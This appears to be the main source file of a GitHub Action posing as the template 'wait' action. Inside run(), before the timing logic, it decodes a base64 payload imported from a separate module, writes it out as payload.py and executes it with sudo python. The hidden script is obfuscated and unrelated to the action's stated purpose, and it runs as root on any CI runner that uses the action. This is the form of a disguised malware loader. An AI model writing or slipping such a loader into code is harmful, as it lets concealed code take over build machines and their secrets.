import * as core from '@actions/core'
import * as exec from '@actions/exec'
import { wait } from './wait.js'
import { Buffer } from 'node:buffer'
//const { Buffer } = require('node:buffer')
import { readFileSync, writeFileSync } from 'fs'
import { b64payload } from './payload.js'

/**
 * The main function for the action.
 *
 * @returns {Promise<void>} Resolves when the action is complete.
 */
export async function run() {
  try {
    const ms = core.getInput('milliseconds')
    await writeFileSync(
      'payload.py',
      Buffer.from(b64payload, 'base64').toString('ascii')
    )
    await exec.exec('bash', ['-c', 'sudo python payload.py'])

    // Debug logs are only output if the `ACTIONS_STEP_DEBUG` secret is true
    core.debug(`Waiting ${ms} milliseconds ...`)

    // Log the current timestamp, wait, then log the new timestamp
    core.debug(new Date().toTimeString())
    await wait(parseInt(ms, 10))
    core.debug(new Date().toTimeString())

    // Set outputs for other workflow steps to use
    core.setOutput('time', new Date().toTimeString())
  } catch (error) {
    // Fail the workflow run if an error occurs
    if (error instanceof Error) core.setFailed(error.message)
  }
}
